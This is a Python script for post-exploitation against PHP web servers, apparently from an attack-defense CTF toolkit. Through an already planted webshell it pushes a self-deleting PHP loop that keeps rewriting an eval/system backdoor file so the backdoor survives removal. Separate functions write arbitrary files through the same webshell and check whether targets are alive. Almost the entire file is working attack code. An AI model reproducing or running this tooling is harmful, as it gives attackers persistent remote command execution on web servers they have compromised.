import requests

def trojan_implant(address,webshell,trojan,password):
	payload = ''
	payload += 'ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='
	payload += "'"
	payload += trojan
	payload += "'"
	payload += ';$code='
	payload += "'"
	payload += '<?php @eval($_POST[a]);system($_POST[b]); ?>'
	payload += "'"
	payload += ';while(1){file_put_contents($file,$code);usleep(5000);}'
	data = {password:payload}
	try:
		r = requests.get(address+webshell)
		print address,"Webshell Works Well."
	except:
		print address,"Webshell Failed"
	try:	
		r = requests.post(address+webshell,data=data,timeout=1)
		if r.status_code == 200:
			r = requests.get(address+trojan)
			if r.status_code == 200:
				print "Implant Succeed."
				print "Content:",r.text
				print "*******************************************************"
	except:
		r = requests.get(address+trojan)
		if r.status_code == 200:
			print "Implant Succeed."
			print "Trojan Content:",r.text
			print "*******************************************************" 
		else:
			print "Implant Failed."
			print "*******************************************************" 

def file_implant(address,webshell,name,data,password):
	payload = ''
	payload += '$file='
	payload += "'"
	payload += name
	payload += "';"
	payload += '$code='
	payload += "'"
	payload += data
	payload += "';"
	payload += 'file_put_contents($file,$code);'
	file_data = {password:payload}
	try:
		r = requests.get(address+webshell)
		print address,"Webshell Works Well."
	except:
		print address,"Webshell Failed"
	try:	
		r = requests.post(address+webshell,data=file_data,timeout=1)
		if r.status_code == 200:
			r = requests.get(address+name)
			if r.status_code == 200:
				print "Implant Succeed."
				print "Content:",r.text	
				print "*******************************************************"
	except:
		r = requests.get(address+name)
		if r.status_code == 200:
			print "Implant Succeed."
			print "Content:",r.text
			print "*******************************************************" 
		else:
			print "Implant Failed."
			print "*******************************************************" 

def check(address):
	try:
		r =requests.get(address)
		if r.status_code == 200 :
			print address,"Living."
			print "*******************************************************" 
			return 1
		else:
			print address,"Dead."
			print "*******************************************************"
			return 0
	except:
		print address,"Dead."
		print "*******************************************************"
		return 0